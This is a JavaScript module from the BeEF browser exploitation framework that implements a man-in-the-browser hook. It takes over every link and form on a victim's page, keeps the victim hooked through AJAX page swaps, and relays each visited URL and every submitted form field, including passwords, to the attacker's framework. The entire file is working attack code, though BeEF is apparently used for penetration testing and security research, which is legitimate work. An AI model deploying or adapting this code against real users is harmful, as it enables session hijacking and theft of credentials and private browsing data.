//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

beef.mitb = {
	
	cid: null,
	curl: null,
	
	init: function(cid, curl){
		beef.mitb.cid = cid;
		beef.mitb.curl = curl;
	},
	
	// Initializes the hook on anchors and forms.
	hook: function(){ 	
		beef.onpopstate.push(function(event) {beef.mitb.fetch(document.location, document.getElementsByTagName("html")[0]);});
		beef.onclose.push(function(event) {beef.mitb.endSession();});
		var anchors = document.getElementsByTagName("a");
		var forms = document.getElementsByTagName("form");
		for(var i=0;i<anchors.length;i++){
			anchors[i].onclick = beef.mitb.poisonAnchor;
		}
		for(var i=0;i<forms.length;i++){
			beef.mitb.poisonForm(forms[i]);
		}
	},
	
	// Hooks anchors and prevents them from linking away
	poisonAnchor: function(e){
		try{
			e.preventDefault;
			if(beef.mitb.fetch(e.currentTarget, document.getElementsByTagName("html")[0])){
				var title = "";
				if(document.getElementsByTagName("title").length == 0){
					title = document.title;
				}else{
					title = document.getElementsByTagName("title")[0].innerHTML;
				}
				history.pushState({ Be: "EF" }, title, e.currentTarget);
			}
		}catch(e){
			console.error('beef.mitb.poisonAnchor - failed to execute: ' + e.message);
		}
		return false;
	},
	
	// Hooks forms and prevents them from linking away
	poisonForm: function(form){
		form.onsubmit=function(e){
			var inputs = form.getElementsByTagName("input");
			var query = "";
			for(var i=0;i<inputs.length;i++){
				if(i>0 && i<inputs.length-1) query += "&";
				switch(inputs[i].type){
					case "submit":
						break;
					default:
						query += inputs[i].name + "=" + inputs[i].value;
						break;
				}
			}
			e.preventdefault;
			beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
			history.pushState({ Be: "EF" }, "", form.action);
			return false;
		}
	},
	
	// Fetches a hooked form with AJAX
	fetchForm: function(url, query, target){
		try{
			var y = new XMLHttpRequest();
			y.open('POST', url, false);
			y.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			y.onreadystatechange = function(){
				if(y.readyState == 4 && y.responseText != ""){
					target.innerHTML = y.responseText;
					setTimeout(beef.mitb.hook, 10);
				}
			}
			y.send(query);
			beef.mitb.sniff("POST: "+url+" ["+query+"]");
			return true;
		}catch(x){
			return false;
		}
	},
	
	// Fetches a hooked link with AJAX
	fetch: function(url, target){
		try{
			var y = new XMLHttpRequest();
			y.open('GET', url,false);
			y.onreadystatechange = function(){
				if(y.readyState == 4 && y.responseText != ""){
					target.innerHTML = y.responseText;
					setTimeout(beef.mitb.hook, 10);
				}
			}
			y.send(null);
			beef.mitb.sniff("GET: "+url);
			return true;
		}catch(x){
			window.open(url);
			beef.mitb.sniff("GET [New Window]: "+url);
			return false;
		}
	},
	
	// Relays an entry to the framework
	sniff: function(result){
		try{
			beef.net.send(beef.mitb.cid, beef.mitb.curl, result);
		}catch(x){}
		return true;
	},
	
	// Signals the Framework that the user has lost the hook
	endSession: function(){
		beef.mitb.sniff("Window closed.");
	}
}
